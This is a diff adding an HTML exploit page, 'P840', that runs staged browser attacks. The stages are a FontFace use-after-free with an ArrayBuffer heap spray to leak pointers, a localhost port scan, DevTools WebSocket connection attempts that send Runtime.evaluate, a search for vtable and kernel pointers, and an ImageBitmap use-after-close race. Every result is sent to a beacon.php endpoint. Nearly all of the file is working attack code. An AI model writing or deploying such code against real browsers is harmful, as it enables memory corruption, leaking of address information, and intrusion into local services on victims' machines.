@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P840</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P840: Inspector Port Scan + q13 Oracle + Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P840-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+
+/* ===== PHASE A: FontFace UAF (PROVEN pattern from P837) ===== */
+log('--- Phase A: FontFace UAF ---','hot');
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('Reclaim missed (nz='+bestNz+'), reloading...','fail');
+    setTimeout(function(){location.reload();},500);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var u8=new Uint8Array(ab);
+
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var H=BigInt(0),Hstr='unknown';
+  if(q11hi>0){
+    H=q11-BigInt(0x68);
+    Hstr='0x'+H.toString(16);
+  }
+  var q13=bu[13];
+  var q13str='0x'+q13.toString(16).padStart(12,'0');
+
+  bn('UAF-OK','H='+Hstr+'|q13='+q13str+'|nz='+bestNz);
+  log('H = '+Hstr+' | q13 = '+q13str+' | nz='+bestNz,'ok');
+
+  /* Save baseline snapshot */
+  var baseline=new Uint8Array(192);
+  for(var i=0;i<192;i++)baseline[i]=u8[i];
+
+  /* ===== PHASE B: Localhost port scan ===== */
+  log('','');
+  log('--- Phase B: Localhost port scan ---','hot');
+
+  var ports=[9222,9229,9230,9231,1234,2345,3456,4200,8080,8081,8443,
+    12321,38000,38001,7681,7682,9026,1337,80,443,3000,6789,
+    47631,49152,5037,5555,11111,22222];
+
+  var portResults=[];
+  var portIdx=0;
+
+  function scanPort(port){
+    return new Promise(function(resolve){
+      var done=false;
+      var timer=setTimeout(function(){
+        done=true;
+        resolve({port:port,status:'timeout'});
+      },600);
+
+      try{
+        var x=new XMLHttpRequest();
+        x.timeout=500;
+        x.open('GET','http://127.0.0.1:'+port+'/',true);
+        x.onload=function(){
+          if(!done){done=true;clearTimeout(timer);
+            resolve({port:port,status:'open-'+x.status});}
+        };
+        x.onerror=function(){
+          if(!done){done=true;clearTimeout(timer);
+            resolve({port:port,status:'refused'});}
+        };
+        x.ontimeout=function(){
+          if(!done){done=true;clearTimeout(timer);
+            resolve({port:port,status:'timeout'});}
+        };
+        x.send();
+      }catch(e){
+        if(!done){done=true;clearTimeout(timer);
+          resolve({port:port,status:'err-'+e.message.slice(0,15)});}
+      }
+    });
+  }
+
+  function scanBatch(){
+    var batch=[];
+    for(var i=0;i<6&&portIdx<ports.length;i++,portIdx++){
+      batch.push(scanPort(ports[portIdx]));
+    }
+    if(batch.length===0){finishPortScan();return;}
+    Promise.all(batch).then(function(results){
+      for(var i=0;i<results.length;i++){
+        var r=results[i];
+        portResults.push(r);
+        if(r.status!=='timeout'&&r.status!=='refused'){
+          log('  :'+r.port+' = '+r.status,'hot');
+        }
+      }
+      scanBatch();
+    });
+  }
+
+  function finishPortScan(){
+    var interesting=portResults.filter(function(r){
+      return r.status!=='timeout'&&r.status!=='refused';
+    });
+    log('Port scan done: '+portResults.length+' tested, '+interesting.length+' interesting','info');
+    bn('PORTS',portResults.map(function(r){return r.port+':'+r.status;}).join(','));
+
+    /* Try WebSocket on DevTools ports */
+    var wsPorts=[9222,9229,12321,38000];
+    var wsResults=[];
+    var wsIdx=0;
+
+    function tryWS(){
+      if(wsIdx>=wsPorts.length){finishWS();return;}
+      var p=wsPorts[wsIdx++];
+      try{
+        var ws=new WebSocket('ws://127.0.0.1:'+p+'/devtools/page/1');
+        var wsDone=false;
+        var timer=setTimeout(function(){
+          wsDone=true;
+          try{ws.close();}catch(e){}
+          wsResults.push(p+':timeout');
+          tryWS();
+        },800);
+
+        ws.onopen=function(){
+          if(!wsDone){wsDone=true;clearTimeout(timer);
+            wsResults.push(p+':OPEN');
+            log('WS :'+p+' CONNECTED!','hot');
+            bn('WS-OPEN','port='+p);
+            try{ws.send(JSON.stringify({id:1,method:'HeapProfiler.takeHeapSnapshot',params:{}}));}catch(e){}
+            try{ws.send(JSON.stringify({id:2,method:'Runtime.evaluate',params:{expression:'process.pid||0'}}));}catch(e){}
+            ws.onmessage=function(e){
+              bn('WS-MSG-'+p,String(e.data).slice(0,800));
+              log('WS MSG: '+String(e.data).slice(0,200),'hot');
+            };
+            setTimeout(function(){try{ws.close();}catch(e){} tryWS();},1500);
+          }
+        };
+        ws.onerror=function(){
+          if(!wsDone){wsDone=true;clearTimeout(timer);wsResults.push(p+':err');tryWS();}
+        };
+        ws.onclose=function(){
+          if(!wsDone){wsDone=true;clearTimeout(timer);wsResults.push(p+':closed');tryWS();}
+        };
+      }catch(e){wsResults.push(p+':except');tryWS();}
+    }
+
+    function finishWS(){
+      bn('WS-SCAN',wsResults.join('|'));
+      log('WebSocket: '+wsResults.join(', '),'info');
+      startPhaseC();
+    }
+
+    tryWS();
+  }
+
+  scanBatch();
+
+  /* ===== PHASE C: q13 oracle experiment ===== */
+  function startPhaseC(){
+    log('','');
+    log('--- Phase C: q13 modification oracle ---','hot');
+
+    var origQ13=q13;
+    var oracleResults=[];
+
+    /* Refresh baseline */
+    for(var i=0;i<192;i++)baseline[i]=u8[i];
+
+    /* Test 1: Zero q13, trigger fonts.check */
+    bu[13]=BigInt(0);
+    var t1='';
+    try{
+      t1+='check='+document.fonts.check('16px f1');
+    }catch(e){t1+='check=ERR:'+e.message.slice(0,25);}
+
+    /* Scan for changes */
+    var ch1=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==baseline[i])ch1.push(i.toString(16)+':'+baseline[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    t1+='|ch='+ch1.length;
+    if(ch1.length>0)t1+='|'+ch1.slice(0,8).join(',');
+    oracleResults.push('q13=0:'+t1);
+    log('  q13=0: '+t1,'info');
+    for(var i=0;i<192;i++)baseline[i]=u8[i];
+
+    /* Test 2: Set q13 = H (self-reference) */
+    bu[13]=H;
+    var t2='';
+    try{
+      t2+='check='+document.fonts.check('16px f1');
+    }catch(e){t2+='check=ERR:'+e.message.slice(0,25);}
+    var ch2=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==baseline[i])ch2.push(i.toString(16)+':'+baseline[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    t2+='|ch='+ch2.length;
+    if(ch2.length>0)t2+='|'+ch2.slice(0,8).join(',');
+    oracleResults.push('q13=H:'+t2);
+    log('  q13=H: '+t2,'info');
+    for(var i=0;i<192;i++)baseline[i]=u8[i];
+
+    /* Test 3: Restore original q13, render text */
+    bu[13]=origQ13;
+    var t3='';
+    try{
+      var tc=document.createElement('canvas');
+      tc.width=200;tc.height=50;
+      var tctx=tc.getContext('2d');
+      tctx.font='24px f1';
+      tctx.fillText('PROBE',10,30);
+      var pd=tctx.getImageData(0,0,200,50).data;
+      var nzpx=0;for(var i=0;i<pd.length;i+=4){if(pd[i+3]>0)nzpx++;}
+      t3+='render='+nzpx+'px';
+    }catch(e){t3+='render=ERR:'+e.message.slice(0,25);}
+    var ch3=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==baseline[i])ch3.push(i.toString(16)+':'+baseline[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    t3+='|ch='+ch3.length;
+    if(ch3.length>0)t3+='|'+ch3.slice(0,8).join(',');
+    oracleResults.push('q13=orig:'+t3);
+    log('  q13=original: '+t3,'info');
+    for(var i=0;i<192;i++)baseline[i]=u8[i];
+
+    /* Test 4: Zero EVERYTHING, then trigger operations */
+    for(var i=0;i<24;i++)bu[i]=BigInt(0);
+    var t4='';
+    try{t4+='check='+document.fonts.check('16px f1');}catch(e){t4+='check=ERR:'+e.message.slice(0,25);}
+    try{
+      face.load().then(function(){}).catch(function(){});
+      t4+='|load=ok';
+    }catch(e){t4+='|load=ERR:'+e.message.slice(0,25);}
+    var ch4=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==0)ch4.push(i.toString(16)+'='+u8[i].toString(16));
+    }
+    t4+='|written='+ch4.length;
+    if(ch4.length>0)t4+='|bytes='+ch4.slice(0,15).join(',');
+    oracleResults.push('zeroed:'+t4);
+    log('  all-zeroed: '+t4,'info');
+
+    bn('Q13',oracleResults.join('||'));
+
+    /* ===== PHASE D: Virtual object spray + reclaim ===== */
+    log('','');
+    log('--- Phase D: Vtable residue hunt ---','hot');
+
+    var vtResults=[];
+    var codeHits=[];
+
+    /* Strategy: Create objects, null refs, GC pressure, spray ABs, scan for non-heap pointers */
+    var szTests=[
+      {name:'Event',sz:0,make:function(){return new Event('x');}},
+      {name:'Comment',sz:0,make:function(){return document.createComment('x');}},
+      {name:'TextNode',sz:0,make:function(){return document.createTextNode('x');}},
+      {name:'Attr',sz:0,make:function(){return document.createAttribute('x');}},
+    ];
+
+    for(var ti=0;ti<szTests.length;ti++){
+      var test=szTests[ti];
+      /* Create 200 objects */
+      var objs=[];
+      try{for(var i=0;i<200;i++)objs.push(test.make());}catch(e){continue;}
+
+      /* Release all references */
+      objs.length=0;
+      objs=null;
+
+      /* GC pressure */
+      var junk=[];
+      for(var i=0;i<3000;i++)junk.push(new ArrayBuffer(64));
+      junk=null;
+
+      /* Spray multiple AB sizes to try to reclaim */
+      var testSizes=[32,48,64,80,96,112,128,144,160,176,192,224,256,320];
+      for(var si=0;si<testSizes.length;si++){
+        var sz=testSizes[si];
+        var spray=[];
+        for(var i=0;i<30;i++)spray.push(new ArrayBuffer(sz));
+
+        for(var i=0;i<spray.length;i++){
+          var bv2=new BigUint64Array(spray[i]);
+          for(var j=0;j<bv2.length;j++){
+            var val=bv2[j];
+            if(val!==BigInt(0)){
+              var hi=Number(val>>BigInt(32));
+              /* Code pointers: small hi (not 0x100xx heap range), nonzero */
+              if(hi>0&&hi<0x1000){
+                codeHits.push(test.name+':sz'+sz+',q'+j+'=0x'+val.toString(16));
+              }
+              /* Kernel pointers */
+              if(hi>=0xFFFF8000){
+                codeHits.push(test.name+':sz'+sz+',q'+j+'=KERN:0x'+val.toString(16));
+              }
+              /* Any nonzero that's not a heap ptr */
+              if(hi!==0&&(hi<0x10000||hi>=0xFFFF0000)&&hi!==0xFFFFFFFF){
+                vtResults.push(test.name+':sz'+sz+',ab'+i+',q'+j+'=0x'+val.toString(16));
+              }
+            }
+          }
+        }
+      }
+    }
+
+    log('Vtable hunt: '+codeHits.length+' code hits, '+vtResults.length+' non-heap','info');
+    if(codeHits.length>0){
+      for(var i=0;i<Math.min(codeHits.length,10);i++)log('  CODE: '+codeHits[i],'hot');
+    }
+    bn('VTABLE','code='+codeHits.length+'|nonheap='+vtResults.length+'|hits='+codeHits.slice(0,5).join(';;'));
+
+    /* ===== PHASE E: ImageBitmap close race ===== */
+    log('','');
+    log('--- Phase E: ImageBitmap race ---','hot');
+
+    var ibDone=0,ibHits=0,ibTotal=20;
+    try{
+      var srcC=document.createElement('canvas');
+      srcC.width=32;srcC.height=32;
+      var sctx2=srcC.getContext('2d');
+      sctx2.fillStyle='#F00';sctx2.fillRect(0,0,32,32);
+
+      for(var a=0;a<ibTotal;a++){
+        (function(idx){
+          createImageBitmap(srcC).then(function(bmp){
+            bmp.close();
+            try{
+              var dc=document.createElement('canvas');
+              dc.width=32;dc.height=32;
+              var dctx=dc.getContext('2d');
+              dctx.drawImage(bmp,0,0);
+              var p=dctx.getImageData(0,0,1,1).data;
+              if(p[0]>0)ibHits++;
+            }catch(e){}
+            ibDone++;
+            if(ibDone>=ibTotal)finishAll();
+          }).catch(function(){ibDone++;if(ibDone>=ibTotal)finishAll();});
+        })(a);
+      }
+    }catch(e){
+      bn('IB-ERR',e.message);
+      finishAll();
+    }
+
+    function finishAll(){
+      log('ImageBitmap race: '+ibHits+'/'+ibTotal+' use-after-close','info');
+      bn('IB','hits='+ibHits+'/'+ibTotal);
+
+      log('','');
+      log('====== P840 COMPLETE ======','hot');
+      var summary='H='+Hstr+'|q13='+q13str+
+        '|ports='+portResults.length+'/'+portResults.filter(function(r){return r.status.indexOf('open')===0;}).length+
+        '|ws=done|q13oracle=4tests|vtable='+codeHits.length+
+        '|ib='+ibHits+'/'+ibTotal;
+      bn('DONE',summary);
+      log(summary,'ok');
+    }
+  }
+},200);
+
+</script></body></html>
